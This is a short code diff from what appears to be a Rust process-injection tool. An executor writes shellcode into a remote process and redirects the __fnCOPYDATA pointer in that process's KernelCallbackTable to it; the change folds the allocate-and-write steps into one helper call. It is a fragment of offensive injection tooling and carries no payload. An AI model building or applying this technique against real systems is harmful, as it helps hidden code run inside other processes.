@@ -168,8 +168,7 @@ impl ExecutionMethod for KernelCallbackTableExecutor {
 
         println!("KernelCallbackTable: {:?}", kct);
 
-        let shellcode_mem = remote_process.alloc(shellcode_to_exec.len(), true)?;
-        remote_process.write(shellcode_mem, &shellcode_to_exec)?;
+        let shellcode_mem = remote_process.write_shellcode(shellcode_to_exec)?;
 
         kct.__fnCOPYDATA = shellcode_mem as usize;
         let newkct_addr = remote_process.alloc(std::mem::size_of::<KernelCallbackTable>(), true)?;
